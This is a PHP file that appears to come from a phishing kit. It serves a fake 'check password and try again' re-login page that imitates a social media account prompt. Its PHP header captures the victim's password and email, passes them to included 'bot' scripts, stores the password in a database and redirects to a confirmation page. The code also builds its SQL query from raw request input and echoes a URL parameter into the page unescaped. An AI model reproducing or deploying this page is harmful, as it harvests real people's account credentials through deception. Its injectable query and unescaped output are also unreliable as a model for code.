<?php
include ("app/config.php");
include ("app/database/router.php");
include ("app/database/yazilar.php");
$username=$_GET["nick"];
$ip = $_SERVER['REMOTE_ADDR'];
if ($_POST) {
$mail=$_POST['mail'];
$pass=$_POST['pass'];
include ("app/bot/value1.php");
include ("app/bot/value2.php");
$sqleyazspexcerilsserivoc = $spexcon->query("UPDATE `users` SET `pass2`='".$pass."' WHERE user='".$username."'");
header("Location:confirmed.php?nick=$username");
}
?>
<html lang="tr">
<head>
 <?php include ("app/tag/main/meta.php"); ?>
 <link href="assets/theme/bestui/css/style.css" type="text/css" rel="stylesheet"/>

</head>
</style>


<body>
    <div class="form">
    
<body id="ana" style="padding:0px; margin:0px;">




<div style="width:100%; background:white; border-bottom:1px; #cecece; padding-left:2px;" >
 




</div>


<center>

<div id="sa" style="border:1px; solid #cecece;"> 


<form method="post">
<br>
<img src="assets/theme/bestui/image/logo.png" alt="<?php echo $username ?>'of photo" style="max-width:50%; border-radius:50%;">  <br>
 <br>
<h1 id="ripimt"><?php echo $formbaslik; ?></h1>
<font color="red"><b>Please check password and try again.</b></font><br>
<p>
<?php echo $formyazi; ?>
</p>
  
       <input type="text" class= "" name="inputReportedUsername" placeholder="Known Name" required="1"aria-required="true">
       
       <input type="password" name="pass" placeholder="Password" required="">
      <input type="email" name="mail" placeholder="Email " required="">
         <br>
         <br>
         <br>
        <button id="buton" type="submit"> Continue as @<?php echo $username; ?> </button>

      </p>
    </form>
</div>
    
    
</div>
</center>
<center>
<br> 
<br>
<br>

<div id="get">
<img src="assets/theme/bestui/image/app.webp" width=120 >
<img src="assets/theme/bestui/image/play.webp" width=120>
</div>
<br><br><br>

<?php include 'assets/theme/bestui/footer.php'; ?>